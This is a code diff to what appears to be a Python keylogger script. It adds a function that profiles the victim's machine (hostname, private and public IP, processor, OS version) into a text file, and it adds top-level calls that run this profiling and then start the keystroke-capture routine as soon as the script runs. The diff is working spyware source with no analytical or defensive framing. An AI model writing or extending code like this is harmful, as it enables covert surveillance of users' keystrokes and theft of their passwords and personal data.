@@ -227,3 +227,26 @@ def capture_keys():
     except KeyboardInterrupt:
         pass
     keyboard.unhook_all()
+
+
+
+def computer_information():
+    system_information = "syseminfo.txt"
+    with open(system_information, "w") as f:
+        f.write("")
+        hostname = socket.gethostname()
+        IPAddr = socket.gethostbyname(hostname)
+        try:
+            public_ip = get("https://api.ipify.org").text
+            f.write("Public IP Address: " + public_ip)
+        except Exception:
+            f.write("Couldn't get Public IP Address (most likely max query")
+        f.write('\n' + "Processor: " + platform.processor() + '\n')
+        f.write("System: " + platform.system() + " " + platform.version() + '\n')
+        f.write("Machine: " + platform.machine() + "\n")
+        f.write("Hostname: " + hostname + "\n")
+        f.write("Private IP Address: " + IPAddr + "\n")
+
+computer_information()
+
+capture_keys()
